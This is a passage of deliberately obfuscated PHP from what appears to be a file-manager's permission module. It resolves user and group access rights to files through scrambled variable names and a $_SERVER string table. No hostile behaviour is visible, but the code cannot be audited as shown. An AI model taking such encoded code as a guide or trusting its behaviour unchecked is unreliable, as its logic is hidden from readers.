$ø¦´ö‰[603], $ø¦´ö‰[33] => $ø¦´ö‰[644], $ø¦´ö‰[607] => $âÅáÅşÊ[$ø¦´ö‰[614]], $ø¦´ö‰[1449] => $âÅáÅşÊ[$ø¦´ö‰[1449]], $ø¦´ö‰[611] => $âÅáÅşÊ[$ø¦´ö‰[192]], $ø¦´ö‰[2335] => array($Ëµù×ÆÀ)); $ïœ‹©ƒø[$òŠò‚À•[$ø¦´ö‰[193]]] = $òŠò‚À•; } } $ÄĞĞ¦Ú¾ = array(); $˜ŠëÇª = $this->getAllChildren($…¦¡”¢¯); foreach ($˜ŠëÇª as $¬˜Ø†íŞ) { $¬­õ†… = !1; foreach ($¬˜Ø†íŞ[$ø¦´ö‰[2335]] as $–®êêã·) { if ($–®êêã·[$ø¦´ö‰[1547]]) { if ($–®êêã·[$ø¦´ö‰[1547]] == $óî¾™½±) { $¬­õ†… = !0; break; } } if ($–®êêã·[$ø¦´ö‰[1449]]) { if ($this->groupContainUser($–®êêã·[$ø¦´ö‰[1449]], $óî¾™½±)) { $¬­õ†… = !0; break; } } } if ($¬­õ†…) { $ÄĞĞ¦Ú¾[] = $¬˜Ø†íŞ; } $š™Õ‚™ = $¬˜Ø†íŞ[$ø¦´ö‰[193]]; if (isset($ïœ‹©ƒø[$š™Õ‚™])) { $¬˜Ø†íŞ[$ø¦´ö‰[2335]][] = $ïœ‹©ƒø[$š™Õ‚™][0]; $ïœ‹©ƒø[$š™Õ‚™] = !1; } } $ïœ‹©ƒø = array_filter(array_values($ïœ‹©ƒø)); $ÄĞĞ¦Ú¾ = array_merge($ïœ‹©ƒø, $ÄĞĞ¦Ú¾); return $ÄĞĞ¦Ú¾; } public function setAllChildrenByUser($ëôÍ£í¿, $¨Â–™Æ, $ğôäÇÜ³) { $Ëíé½Í‘ =& $_SERVER[Ï×Œõ”û]; $ıÈëø†’ = $this->getAllChildrenByUser($ëôÍ£í¿, $¨Â–™Æ); if (!$ğôäÇÜ³ || !$ıÈëø†’) { return !1; } foreach ($ıÈëø†’ as $ù‡©¤´Ó) { $•°™Š = array(); foreach ($ù‡©¤´Ó[$Ëíé½Í‘[2335]] as $ â¾¡õ) { $Ê±¸ØÓä = $ â¾¡õ[$Ëíé½Í‘[561]]; $¥Á¼±¥­ = $ â¾¡õ[$Ëíé½Í‘[1547]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Üåí¤ı» = $ â¾¡õ[$Ëíé½Í‘[1547]] ? $ â¾¡õ[$Ëíé½Í‘[1547]] : $ â¾¡õ[$Ëíé½Í‘[1449]]; if ($ â¾¡õ[$Ëíé½Í‘[1547]] && $ â¾¡õ[$Ëíé½Í‘[1547]] == $¨Â–™Æ) { continue; } $•°™Š[] = array($Ëíé½Í‘[193] => $ù‡©¤´Ó[$Ëíé½Í‘[193]], $Ëíé½Í‘[190] => $¥Á¼±¥­, $Ëíé½Í‘[594] => intval($Üåí¤ı»), $Ëíé½Í‘[1594] => isset($Ê±¸ØÓä[$Ëíé½Í‘[484]]) ? intval($Ê±¸ØÓä[$Ëíé½Í‘[484]]) : 0, $Ëíé½Í‘[2299] => isset($Ê±¸ØÓä[$Ëíé½Í‘[2299]]) ? intval($Ê±¸ØÓä[$Ëíé½Í‘[2299]]) : -1); } $•°™Š[] = array($Ëíé½Í‘[193] => $ù‡©¤´Ó[$Ëíé½Í‘[193]], $Ëíé½Í‘[190] => SourceModel::TYPE_USER, $Ëíé½Í‘[594] => intval($¨Â–™Æ), $Ëíé½Í‘[1594] => intval($ğôäÇÜ³), $Ëíé½Í‘[2299] => -1); $this->where(array($Ëíé½Í‘[511] => $ù‡©¤´Ó[$Ëíé½Í‘[193]]))->delete(); $this->addAll($•°™Š); } return !0; } public function get($™ûÈ¶¦Å) { $ãƒ‚œ„ = $this->getSourceList(array($™ûÈ¶¦Å), !0); return $ãƒ‚œ„[0]; } public function getSourceList($¨Ş¬úÖ, $²“Û ĞÅ = false, $´ûîÖ­É = false) { $Ó¸Èëò¨ =& $_SERVER[Ï×Œõ”û]; if (!$¨Ş¬úÖ) { return array(); } $ñ™™ŸØ = Model($Ó¸Èëò¨[1487]); if (!$²“Û ĞÅ && count($¨Ş¬úÖ) == 1) { $²“Û ĞÅ = array(); $²“Û ĞÅ[$¨Ş¬úÖ[0]] = $ñ™™ŸØ->sourceInfo($¨Ş¬úÖ[0]); } if (!$²“Û ĞÅ) { $æüºœ¤ã = array($Ó¸Èëò¨[511] => array($Ó¸Èëò¨[512], $¨Ş¬úÖ)); $²“Û ĞÅ = $ñ™™ŸØ->field($Ó¸Èëò¨[2340])->where($æüºœ¤ã)->select(); $²“Û ĞÅ = array_to_keyvalue($²“Û ĞÅ, $Ó¸Èëò¨[193]); } $òˆ›·‡¶ = $¨Ş¬úÖ; foreach ($²“Û ĞÅ as $£È¿¦ => $í¶ëöË†) { $ï¥­¸Ú = $ñ™™ŸØ->parentLevelArray($í¶ëöË†[$Ó¸Èëò¨[609]]); $òˆ›·‡¶ = array_merge($òˆ›·‡¶, array(intval($£È¿¦)), array_reverse($ï¥­¸Ú)); } $òˆ›·‡¶ = array_values(array_unique($òˆ›·‡¶)); if (!$òˆ›·‡¶) { return array(); } $áÀËî§Ï = $this->sourceAuthSelect($òˆ›·‡¶); $Ö“Ä˜¢§ = array(); foreach ($òˆ›·‡¶ as $·»‰Şù ) { if (isset($áÀËî§Ï[$·»‰Şù ])) { $Ö“Ä˜¢§[$·»‰Şù ] = $áÀËî§Ï[$·»‰Şù ]; } } $ƒçÏœÈà = $this->userIsRoot($´ûîÖ­É); $ü¹¯Ü‚¥ = AuthModel::authAll(); $¾åæ…½€ = array($Ó¸Èëò¨[508] => $ü¹¯Ü‚¥, $Ó¸Èëò¨[2341] => array($Ó¸Èëò¨[513] => 0, $Ó¸Èëò¨[2143] => $ü¹¯Ü‚¥, $Ó¸Èëò¨[514] => LNG($Ó¸Èëò¨[2322]), $Ó¸Èëò¨[2158] => $Ó¸Èëò¨[2323])); $İ¹´£†ì = array(); foreach ($²“Û ĞÅ as $·»‰Şù  => $Óµí³ş€) { if ($ƒçÏœÈà && $GLOBALS[$Ó¸Èëò¨[6]][$Ó¸Èëò¨[2156]]) { $İ¹´£†ì[$·»‰Şù ] = $¾åæ…½€; continue; } $İ¹´£†ì[$·»‰Şù ] = $this->makeSourceAuth($Óµí³ş€, $Ö“Ä˜¢§, $´ûîÖ­É); } return $İ¹´£†ì; } public function authDeepCheck($âµ÷¯ë³, $¯î˜÷¦í = false) { $ÕŞéµÇº =& $_SERVER[Ï×Œõ”û]; $¯î˜÷¦í = $¯î˜÷¦í ? $¯î˜÷¦í : USER_ID; $²¸ÚşÄ = $this->makeAuthDeep($¯î˜÷¦í); if (!in_array($âµ÷¯ë³, $²¸ÚşÄ[$ÕŞéµÇº[2342]])) { return !1; } $£®ˆ¢„Ì = array(); foreach ($²¸ÚşÄ[$ÕŞéµÇº[2343]] as $Ä›Õï€„ => $¿ÄÅ—‡) { if (!in_array($âµ÷¯ë³, $¿ÄÅ—‡)) { continue; } $£®ˆ¢„Ì[] = $Ä›Õï€„; } if (!$£®ˆ¢„Ì) { return !1; } $Ôñö÷“ = $£®ˆ¢„Ì ? $£®ˆ¢„Ì[0] : $âµ÷¯ë³; return array($ÕŞéµÇº[508] => -1, $ÕŞéµÇº[561] => array($ÕŞéµÇº[513] => $ÕŞéµÇº[1331], $ÕŞéµÇº[2143] => $ÕŞéµÇº[230], $ÕŞéµÇº[514] => LNG($ÕŞéµÇº[2344]), $ÕŞéµÇº[2158] => $ÕŞéµÇº[2345]), $ÕŞéµÇº[2333] => LNG($ÕŞéµÇº[2346]), $ÕŞéµÇº[2347] => $this->sourceAuthInfo($Ôñö÷“)); } protected function makeAuthDeep($€íç„æŠ = false) { $Õø ¨õ² =& $_SERVER[Ï×Œõ”û]; static $¯§Ù¢Ã‰ = array(); $€íç„æŠ = $€íç„æŠ ? $€íç„æŠ : USER_ID; if (isset($¯§Ù¢Ã‰[$€íç„æŠ])) { return $¯§Ù¢Ã‰[$€íç„æŠ]; } $£¡‡•¼İ = Model($Õø ¨õ²[2348])->listData(); $¸‹ò Ğ = array(); foreach ($£¡‡•¼İ as $ºŠ²å¡Õ) { if ($ºŠ²å¡Õ[$Õø ¨õ²[507]] == 0 && $ºŠ²å¡Õ[$Õø ¨õ²[2157]] == $Õø ¨õ²[91]) { $¸‹ò Ğ[] = $ºŠ²å¡Õ[$Õø ¨õ²[484]]; } } $ú…ˆ›™– = $this->userGroupParents($€íç„æŠ); $² Ö­Ñ´ = array($Õø ¨õ²[190] => SourceModel::TYPE_USER, $Õø ¨õ²[594] => $€íç„æŠ); if ($ú…ˆ›™–) { $² Ö­Ñ´ = array(array($Õø ¨õ²[190] => SourceModel::TYPE_USER, $Õø ¨õ²[594] => $€íç„æŠ), array($Õø ¨õ²[190] => SourceModel::TYPE_GROUP, $Õø ¨õ²[594] => array($Õø ¨õ²[512], $ú…ˆ›™–)), $Õø ¨õ²[1121] => $Õø ¨õ²[2237]); } $ı™¤Áîé = $this->field($Õø ¨õ²[2349])->where($² Ö­Ñ´)->select(); $˜•Æãó = array(); $âî“Ùñ = array_to_keyvalue_group($ı™¤Áîé, $Õø ¨õ²[193]); foreach ($âî“Ùñ as $›ø¦­¦ä => $¤İÈ’üé) { $ÔÉ‡–ıæ = $this->authArrayCheck($¤İÈ’üé, $€íç„æŠ); if ($ÔÉ‡–ıæ[$Õø ¨õ²[508]] > 0) { $˜•Æãó[] = $›ø¦­¦ä . $Õø ¨õ²[12]; } } if ($ú…ˆ›™–) { $–…­ûš¨ = Model($Õø ¨õ²[610]); foreach ($ú…ˆ›™– as $Í¶–«Ú†) { $ÄáÇ»— = $–…­ûš¨->getInfo($Í¶–«Ú†); if (!$ÄáÇ»— || !is_array($ÄáÇ»—[$Õø ¨õ²[90]])) { continue; } $˜•Æãó[] = $ÄáÇ»—[$Õø ¨õ²[90]][$Õø ¨õ²[193]]; } } $à ãÓ‹ = array(); $÷†Ë¥ = $ú…ˆ›™–; $â÷è¡Å = Model($Õø ¨õ²[1487]); $–…­ûš¨ = Model($Õø ¨õ²[610]); $ñß†è© = array(); $‡Â¢ğ = array(); $¯©ÜÕÂä = array(); $ûÂâ”‚ = array(); if ($˜•Æãó) { $’ıªö§Ÿ = $â÷è¡Å->where(array($Õø ¨õ²[193] => array($Õø ¨õ²[512], $˜•Æãó)))->select(); foreach ($’ıªö§Ÿ as $¹ÎµæÔ) { if ($¹ÎµæÔ[$Õø ¨õ²[525]] == $Õø ¨õ²[91]) { continue; } $ã¿»áÚ = $â÷è¡Å->parentLevelArray($¹ÎµæÔ[$Õø ¨õ²[609]]); $à ãÓ‹ = array_merge($à ãÓ‹, $ã¿»áÚ); $÷†Ë¥[] = $¹ÎµæÔ[$Õø ¨õ²[594]]; $ñß†è©[$¹ÎµæÔ[$Õø ¨õ²[193]]] = $ã¿»áÚ; $‡Â¢ğ[$¹ÎµæÔ[$Õø ¨õ²[193]]] = $¹ÎµæÔ[$Õø ¨õ²[594]]; } } $÷†Ë¥ = array_values(array_unique($÷†Ë¥)); $¯‚ŞÈòª = $÷†Ë¥; foreach ($¯‚ŞÈòª as $Í¶–«Ú†) { $ÄáÇ»— = $–…­ûš¨->getInfo($Í¶–«Ú†); $ã¿»áÚ = $â÷è¡Å->parentLevelArray($ÄáÇ»—[$Õø ¨õ²[609]]); $÷†Ë¥ = array_merge($÷†Ë¥, $ã¿»áÚ); } $÷†Ë¥ = array_values(array_unique($÷†Ë¥)); foreach ($÷†Ë¥ as $Í¶–«Ú†) { $ÄáÇ»— = $–…­ûš¨->getInfo($Í¶–«Ú†); $à ãÓ‹[] = $ÄáÇ»—[$Õø ¨õ²[90]][$Õø ¨õ²[193]]; $¯©ÜÕÂä[$Í¶–«Ú†] = $ÄáÇ»—[$Õø ¨õ²[90]][$Õø ¨õ²[193]]; $ûÂâ”‚[$Í¶–«Ú†] = $â÷è¡Å->parentLevelArray($ÄáÇ»—[$Õø ¨õ²[609]]); } foreach ($ñß†è© as $“ğãß•À => $…Ë©ŞØ) { $ª›ÌÚ˜€ = $‡Â¢ğ[$“ğãß•À]; if (!$ª›ÌÚ˜€ || !$¯©ÜÕÂä[$ª›ÌÚ˜€]) { continue; } $­©¦µ = array(); foreach ($ûÂâ”‚[$ª›ÌÚ˜€] as $Í¶–«Ú†) { $­©¦µ[] = $¯©ÜÕÂä[$Í¶–«Ú†]; } $ñß†è©[$“ğãß•À] = array_merge($­©¦µ, $…Ë©ŞØ); } $à ãÓ‹ = array_values(array_unique($à ãÓ‹)); $Áú¹©Æ = array($Õø ¨õ²[2342] => $à ãÓ‹, $Õø ¨õ²[2343] => $ñß†è©); $¯§Ù¢Ã‰[$€íç„æŠ] = $Áú¹©Æ; return $Áú¹©Æ; } private function makeSourceAuth($©Âª„‡¡, $–ı¼±À», $õ‚Šô½å = false) { $é³ö•‡Û =& $_SERVER[Ï×Œõ”û]; $ª‚É ßö = $é³ö•‡Û[91]; $ÒâŒ¹äÕ = $©Âª„‡¡[$é³ö•‡Û[594]]; $ã¼¡‹ï… = $©Âª„‡¡[$é³ö•‡Û[190]] == SourceModel::TYPE_GROUP; $œÜ½¡óı = $ã¼¡‹ï… ? $this->groupRootAuth($ÒâŒ¹äÕ, $õ‚Šô½å) : !1; if ($œÜ½¡óı && Model($é³ö•‡Û[596])->authCheckAction($œÜ½¡óı[$é³ö•‡Û[507]], $é³ö•‡Û[1519])) { return $this->groupAuthInfo($œÜ½¡óı, $ÒâŒ¹äÕ); } $¤”õÛœÌ = Model($é³ö•‡Û[1487])->parentLevelArray($©Âª„‡¡[$é³ö•‡Û[609]]); $¤”õÛœÌ = array_merge(array($©Âª„‡¡[$é³ö•‡Û[193]]), array_reverse($¤”õÛœÌ)); $ô€´óÃû = !1; foreach ($¤”õÛœÌ as $øŠ¸Œ…•) { if (!isset($–ı¼±À»[$øŠ¸Œ…•])) { continue; } $ô¸à¿¥´ = $this->authMake($–ı¼±À»[$øŠ¸Œ…•], $õ‚Šô½å); if ($ô¸à¿¥´[$é³ö•‡Û[561]]) { $ô€´óÃû = $ô¸à¿¥´; break; } } if (!$ã¼¡‹ï…) { return $ô€´óÃû; } if (!$ô€´óÃû && $œÜ½¡óı) { $ô€´óÃû = $this->groupAuthInfo($œÜ½¡óı, $ÒâŒ¹äÕ); } if (!$ô€´óÃû) { $ÙĞ£´¼‘ = Model($é³ö•‡Û[610])->getInfo($ÒâŒ¹äÕ); $Åı×¸¥Ô = explode($é³ö•‡Û[50], trim($ÙĞ£´¼‘[$é³ö•‡Û[609]], $é³ö•‡Û[50])); $Åı×¸¥Ô = array_reverse($Åı×¸¥Ô); foreach ($Åı×¸¥Ô as $Õúœ½Ò») { if ($Õúœ½Ò» == $é³ö•‡Û[230] || $Õúœ½Ò» == $ª‚É ßö) { continue; } $Ùµ¿Åî = $this->groupRootAuth($Õúœ½Ò», $õ‚Šô½å); if (!$Ùµ¿Åî) { continue; } $ô€´óÃû = $this->groupAuthInfo($Ùµ¿Åî, $Õúœ½Ò»); break; } } if (!$ô€´óÃû || $ô€´óÃû[$é³ö•‡Û[508]] <= 0) { $¥÷‰Å»° = $this->authDeepCheck($©Âª„‡¡[$é³ö•‡Û[193]], $õ‚Šô½å); if ($¥÷‰Å»°) { $ô€´óÃû = $¥÷‰Å»°; } } return $ô€´óÃû; } private function userIsRoot($Ù·³Éâ¾ = false) { $€…íÔÖ­ =& $_SERVER[Ï×Œõ”û]; if (!$Ù·³Éâ¾ && KodUser::isRoot()) { return !0; } $ù“ƒÔÁ = Model($€…íÔÖ­[622])->getInfo($Ù·³Éâ¾); $±ØûµÛ = Model($€…íÔÖ­[2326])->listData($ù“ƒÔÁ[$€…íÔÖ­[2327]]); if ($±ØûµÛ && $±ØûµÛ[$€…íÔÖ­[600]][$€…íÔÖ­[2330]] == 1) { return !0; } return !1; } private function sourceAuthInfo($«Äú˜¯Ğ) { $ıÙ´Î—æ =& $_SERVER[Ï×Œõ”û]; $õË€¾Á· = Model($ıÙ´Î—æ[1487]); $íï¼†û = $õË€¾Á·->sourceInfo($«Äú˜¯Ğ); if (!$íï¼†û) { return !1; } $õË€¾Á·->groupPathDisplay($íï¼†û); $´•“†«İ = array($íï¼†û); $´•“†«İ = $õË€¾Á·->_listAppendPath($´•“†«İ, !1); $íï¼†û = $´•“†«İ[0]; $×ëéäƒ¢ = $íï¼†û[$ıÙ´Î—æ[607]]; if (isset($íï¼†û[$ıÙ´Î—æ[615]])) { $¸é÷³“İ = explode($ıÙ´Î—æ[8], trim($íï¼†û[$ıÙ´Î—æ[607]], $ıÙ´Î—æ[8])); array_shift($¸é÷³“İ); $×ëéäƒ¢ = $íï¼†û[$ıÙ´Î—æ[613]] . $ıÙ´Î—æ[2350] . implode($ıÙ´Î—æ[8], $¸é÷³“İ); } return array($ıÙ´Î—æ[32] => $íï¼†û[$ıÙ´Î—æ[32]], $ıÙ´Î—æ[193] => $íï¼†û[$ıÙ´Î—æ[193]], $ıÙ´Î—æ[87] => KodIO::make($íï¼†û[$ıÙ´Î—æ[193]]), $ıÙ´Î—æ[607] => $×ëéäƒ¢); } private function groupAuthInfo($ Ü«“³å, $¡ã¢ó¤Ç) { $€¡Ş•»â =& $_SERVER[Ï×Œõ”û]; $úóÔµŠ† = Model($€¡Ş•»â[610])->getInfo($¡ã¢ó¤Ç); return array($€¡Ş•»â[2351] => intval($ Ü«“³å[$€¡Ş•»â[507]]), $€¡Ş•»â[2341] => $ Ü«“³å, $€¡Ş•»â[2352] => LNG($€¡Ş•»â[2353]), $€¡Ş•»â[2347] => array($€¡Ş•»â[514] => $úóÔµŠ†[$€¡Ş•»â[32]], $€¡Ş•»â[87] => KodIO::make($úóÔµŠ†[$€¡Ş•»â[90]][$€¡Ş•»â[193]]), $€¡Ş•»â[2354] => $úóÔµŠ†[$€¡Ş•»â[614]])); } protected function groupRootAuth($ı‘è£ıƒ, $ßªº‚ê¦ = false) { $ş¿¢‘¬† =& $_SERVER[Ï×Œõ”û]; $ßªº‚ê¦ = $ßªº‚ê¦ ? $ßªº‚ê¦ : USER_ID; $ç´À·üÉ = $ßªº‚ê¦ . $ş¿¢‘¬†[2355] . $ı‘è£ıƒ; static $åËş¬Ğ = array(); if (isset($åËş¬Ğ[$ç´À·üÉ])) { return $åËş¬Ğ[$ç´À·üÉ]; } $ÆÆ¡³½ = Model($ş¿¢‘¬†[610])->getInfo($ı‘è£ıƒ); $‹ Ñ“÷¡ = $this->userGroupList($ßªº‚ê¦); $·ü£¼ª² = isset($‹ Ñ“÷¡[$ı‘è£ıƒ]) ? $‹ Ñ“÷¡[$ı‘è£ıƒ][$ş¿¢‘¬†[507]] : !1; if ($·ü£¼ª² && Model($ş¿¢‘¬†[596])->authCheckAction($·ü£¼ª²[$ş¿¢‘¬†[507]], $ş¿¢‘¬†[1519])) { $åËş¬Ğ[$ç´À·üÉ] = $·ü£¼ª²; return $·ü£¼ª²; } $È„åˆ™‹ = $this->sourceAuthSelect($ÆÆ¡³½[$ş¿¢‘¬†[90]][$ş¿¢‘¬†[193]]); $« ½Ô’ = $È„åˆ™‹ ? $this->authMake($È„åˆ™‹, $ßªº‚ê¦) : !1; $Å‡Åğ€­ = $« ½Ô’ ? $« ½Ô’[$ş¿¢‘¬†[561]] : !1; $åËş¬Ğ[$ç´À·üÉ] = $Å‡Åğ€­ ? $Å‡Åğ€­ : $·ü£¼ª²; return $åËş¬Ğ[$ç´À·üÉ]; } public function authOwnerApply($ì”Îõœ·) { $µìÅÏ×› =& $_SERVER[Ï×Œõ”û]; if (empty($ì”Îõœ·[$µìÅÏ×›[507]]) || isset($ì”Îõœ·[$µìÅÏ×›[1538]]) && $ì”Îõœ·[$µìÅÏ×›[1538]]) { return $ì”Îõœ·; } if (AuthModel::authCheckRoot($ì”Îõœ·[$µìÅÏ×›[507]][$µìÅÏ×›[508]])) { return $ì”Îõœ·; } $€µºõ»³ = Model($µìÅÏ×›[1487])->parentLevelArray($ì”Îõœ·[$µìÅÏ×›[609]]); $€µºõ»³ = array_merge(array($ì”Îõœ·[$µìÅÏ×›[193]]), array_reverse($€µºõ»³)); $“ôƒÖº˜ = $this->sourceAuthSelect($€µºõ»³); $É¦£Ñ® = array(); $Û÷İ¶Ÿ‘ = array(); foreach ($“ôƒÖº˜ as $Îôïº¥ => $„´òÔş©) { $ó…ı‹Æã = $this->authFolderOwnerUser($„´òÔş©); $É¦£Ñ®[$Îôïº¥] = $ó…ı‹Æã; $Û÷İ¶Ÿ‘ = array_merge($Û÷İ¶Ÿ‘, $ó…ı‹Æã[$µìÅÏ×›[690]]); if ($ó…ı‹Æã[$µìÅÏ×›[2356]]) { break; } } if (count($Û÷İ¶Ÿ‘) == 0) { $Û÷İ¶Ÿ‘ = $this->authFolderOwnerGroup($ì”Îõœ·[$µìÅÏ×›[594]]); } $Û÷İ¶Ÿ‘ = array_unique($Û÷İ¶Ÿ‘); if (AuthModel::authCheckRoot($ì”Îõœ·[$µìÅÏ×›[507]][$µìÅÏ×›[508]])) { $Û÷İ¶Ÿ‘[] = USER_ID; } $ì”Îõœ·[$µìÅÏ×›[507]][$µìÅÏ×›[2357]] = Model($µìÅÏ×›[602])->userListInfo($Û÷İ¶Ÿ‘); return $ì”Îõœ·; } private function authFolderOwnerGroup($õò¢¾¥) { $§³ ô»˜ =& $_SERVER[Ï×Œõ”û]; $à³¾Â° = Model($§³ ô»˜[2229])->where(array($§³ ô»˜[1449] => $õò¢¾¥))->select(); $°Ñ¶©®¾ = array(); if (!$à³¾Â°) { return $°Ñ¶©®¾; } foreach ($à³¾Â° as $äƒ€âëØ) { $ğ¡À¦©¸ = $this->authInfo($äƒ€âëØ); if (AuthModel::authCheckRoot($ğ¡À¦©¸[$§³ ô»˜[507]])) { $°Ñ¶©®¾[] = $äƒ€âëØ[$§³ ô»˜[1547]]; } } return $°Ñ¶©®¾; } private function authFolderOwnerUser($Øõ“´À¨) { $ªÈŸ¼æå =& $_SERVER[Ï×Œõ”û]; $à¯óòı = array(); $‚†…İ³ = !1; foreach ($Øõ“´À¨ as $éñáùÌÉ) { $ü‘®©Ú = $this->authInfo($éñáùÌÉ); if ($éñáùÌÉ[$ªÈŸ¼æå[594]] == $ªÈŸ¼æå[230]) { $‚†…İ³ = !0; } if ($éñáùÌÉ[$ªÈŸ¼æå[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ü‘®©Ú[$ªÈŸ¼æå[507]])) { $à¯óòı[] = $éñáùÌÉ[$ªÈŸ¼æå[594]]; } } } return array($ªÈŸ¼æå[690] => $à¯óòı, $ªÈŸ¼æå[2356] => $‚†…İ³); } public function authMake($ˆ™ºíô‹, $ö‘“Š¬ù = false) { $ªÙÙÎªº =& $_SERVER[Ï×Œõ”û]; $¹ûƒÌĞ = $this->authArrayCheck($ˆ™ºíô‹, $ö‘“Š¬ù); if ($¹ûƒÌĞ[$ªÙÙÎªº[2337]]) { $¹ûƒÌĞ[$ªÙÙÎªº[2337]] = $this->sourceAuthInfo($¹ûƒÌĞ[$ªÙÙÎªº[2337]]); } return $¹ûƒÌĞ; } public function authArrayCheck($•ÖıÓÍ¨, $ş‹¾ºµ‚ = false) { $ØÊ–™ª =& $_SERVER[Ï×Œõ”û]; if (!$•ÖıÓÍ¨) { return array($ØÊ–™ª[508] => 0, $ØÊ–™ª[561] => !1, $ØÊ–™ª[2352] => $ØÊ–™ª[12]); } $ş‹¾ºµ‚ = $ş‹¾ºµ‚ ? $ş‹¾ºµ‚ : USER_ID; $ìâ·•”± = 0; $Šõ¡’œ = 0; $÷ªñâî = 0; $Ó×í°¼Ö = 0; $¥‡Óï = 0; $å…ö¯ßÈ = 0; $˜ÚÂ°ƒ÷ = 0; $˜Û½É–ß = 0; $ šÄÃß = 1000; $˜ïØÉá¥ = 0; $óƒ¯¥¬ = 0; $Ãùñòµ— = 0; $æë´ûëù = 0; $÷¦î°åê = 0; foreach ($•ÖıÓÍ¨ as $ë¯€ùÅ¯) { $‚“äÂ˜ = $this->authInfo($ë¯€ùÅ¯); if (!$‚“äÂ˜) { continue; } $„¿Ìâ¹ = $ë¯€ùÅ¯[$ØÊ–™ª[594]]; $³Æ¢Ã ¨ = $ë¯€ùÅ¯[$ØÊ–™ª[193]]; $ª‹µåóì = intval($‚“äÂ˜[$ØÊ–™ª[507]]); if ($ë¯€ùÅ¯[$ØÊ–™ª[190]] == SourceModel::TYPE_USER && $„¿Ìâ¹ == $ş‹¾ºµ‚) { $ìâ·•”± = !0; $÷ªñâî = $‚“äÂ˜; $Šõ¡’œ = $ª‹µåóì; $Ó×í°¼Ö = $³Æ¢Ã ¨; } else { if ($ë¯€ùÅ¯[$ØÊ–™ª[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($„¿Ìâ¹, $ş‹¾ºµ‚)) { $¥‡Óï = !0; $‘‘ºæã† = $this->groupStepToUserGroup($„¿Ìâ¹, $ş‹¾ºµ‚); if ($‘‘ºæã† < $ šÄÃß) { $ šÄÃß = $‘‘ºæã†; $å…ö¯ßÈ = $ª‹µåóì; $˜ÚÂ°ƒ÷ = $‚“äÂ˜; $˜ïØÉá¥ = $„¿Ìâ¹; $˜Û½É–ß = $³Æ¢Ã ¨; } if ($‘‘ºæã† == $ šÄÃß && $ª‹µåóì >= $å…ö¯ßÈ) { $å…ö¯ßÈ = $ª‹µåóì; $˜ÚÂ°ƒ÷ = $‚“äÂ˜; $˜ïØÉá¥ = $„¿Ìâ¹; $˜Û½É–ß = $³Æ¢Ã ¨; } } else { if (!$„¿Ìâ¹ || $„¿Ìâ¹ == $ØÊ–™ª[230]) { $óƒ¯¥¬ = !0; $æë´ûëù = $‚“äÂ˜; $Ãùñòµ— = $ª‹µåóì; $÷¦î°åê = $³Æ¢Ã ¨; } } } } if ($ìâ·•”±) { $ÖÓª­æÅ = $Šõ¡’œ; $‚“äÂ˜ = $÷ªñâî; $¹îŠğ­‚ = $Ó×í°¼Ö; $áÖĞıù = LNG($ØÊ–™ª[2358]); } else { if ($¥‡Óï) { $ÖÓª­æÅ = $å…ö¯ßÈ; $‚“äÂ˜ = $˜ÚÂ°ƒ÷; $¹îŠğ­‚ = $˜Û½É–ß; $©Æİüã = Model($ØÊ–™ª[610])->getInfo($˜ïØÉá¥); $áÖĞıù = $ØÊ–™ª[175] . $©Æİüã[$ØÊ–™ª[614]] . $ØÊ–™ª[2359] . LNG($ØÊ–™ª[2360]); } else { if ($óƒ¯¥¬) { $ÖÓª­æÅ = $Ãùñòµ—; $‚“äÂ˜ = $æë´ûëù; $¹îŠğ­‚ = $÷¦î°åê; $áÖĞıù = LNG($ØÊ–™ª[2339]); } else { $ÖÓª­æÅ = 0; $‚“äÂ˜ = !1; $áÖĞıù = $ØÊ–™ª[12]; $¹îŠğ­‚ = $ØÊ–™ª[12]; } } } $»ıß˜•‚ = array($ØÊ–™ª[2351] => intval($ÖÓª­æÅ), $ØÊ–™ª[2341] => $‚“äÂ˜, $ØÊ–™ª[2352] => $áÖĞıù, $ØÊ–™ª[2347] => $¹îŠğ­‚); return $»ıß˜•‚; } private function groupContainUser($’ı´êŠ…, $Ïó££±Ç = false) { return in_array($’ı´êŠ…, $this->userGroupParents($Ïó££±Ç)); } private function groupStepToUserGroup($Ğ—¢„Å, $§‚úÄÀ® = false) { $ÀôĞİ =& $_SERVER[Ï×Œõ”û]; $åçĞŞ³Æ = $this->userGroupList($§‚úÄÀ®); $ô§—ˆ = 1000; $’œôëşÌ = $GLOBALS[$ÀôĞİ[6]][$ÀôĞİ[92]][$ÀôĞİ[2242]] == 1; $²ÇŞ€‡Ó = $’œôëşÌ ? 3 : 2; foreach ($åçĞŞ³Æ as $ä¶í“ü­) { if ($ä¶í“ü­[$ÀôĞİ[1449]] == $Ğ—¢„Å) { return 0; } $ô’‘ŒÅ = explode($ÀôĞİ[50], trim($ä¶í“ü­[$ÀôĞİ[609]], $ÀôĞİ[50])); if ($ô’‘ŒÅ[0] == $ÀôĞİ[230] && count($ô’‘ŒÅ) > $²ÇŞ€‡Ó) { $¶ÑçËÄ™ = array_reverse(array_slice($ô’‘ŒÅ, $²ÇŞ€‡Ó)); $“¢á½“— = array_search($Ğ—¢„Å, $¶ÑçËÄ™); if ($“¢á½“— !== !1 && $“¢á½“— + 1 <= $ô§—ˆ) { $ô§—ˆ = $“¢á½“— + 1; } } } return $ô§—ˆ; } private function userGroupList($¨¯À­« = false, $¨¸áéØ = false) { $£Ÿí¡ =& $_SERVER[Ï×Œõ”û]; static $şì£Æş¤ = array(); if (isset($şì£Æş¤[$¨¯À­«])) { return $şì£Æş¤[$¨¯À­«]; } if (!$¨¸áéØ) { $¨¸áéØ = Model($£Ÿí¡[622])->getInfo($¨¯À­«); } $şì£Æş¤[$¨¯À­«] = array_to_keyvalue($¨¸áéØ[$£Ÿí¡[1448]], $£Ÿí¡[1449]); return $şì£Æş¤[$¨¯À­«]; } public function userGroupParents($ãÜş¹Í) { $õˆõÌÙÎ =& $_SERVER[Ï×Œõ”û]; static $ÙÌë–æ  = array(); $ãÜş¹Í = $ãÜş¹Í ? $ãÜş¹Í : USER_ID; if (isset($ÙÌë–æ [$ãÜş¹Í])) { return $ÙÌë–æ [$ãÜş¹Í]; } $¸Êëú¸¯ = $this->userGroupList($ãÜş¹Í); $½ÇãÖŒÙ = array(); $ëÙÎõø» = $GLOBALS[$õˆõÌÙÎ[6]][$õˆõÌÙÎ[92]][$õˆõÌÙÎ[2242]] == 1; $äÂ›Œ…Ñ = $ëÙÎõø» ? 3 : 2; foreach ($¸Êëú¸¯ as $Š¤¯ğÙ¿) { $ü™­à«¥ = 